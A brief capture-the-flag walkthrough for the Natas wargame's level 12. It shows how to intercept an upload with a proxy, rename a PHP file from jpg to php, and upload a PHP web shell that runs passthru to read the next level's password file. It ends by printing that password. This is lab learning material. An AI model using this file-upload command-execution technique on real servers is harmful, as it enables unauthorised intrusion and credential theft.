# Level 12 to Level 13

Use a proxy to intersect HTTP traffic (Fiddler or Burp Suite) and upload an hello world php file
```
<?php 
echo 'Hello World!';
```
Modify the extension to be `php` instead of `jpg` in HTTP payload, before seding it

Checking the page give, we can get our hello world printed on the page. It works

By uploading the following, you will get the password
```
<?php 
echo passthru("cat /etc/natas_webpass/natas13");
```

`jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`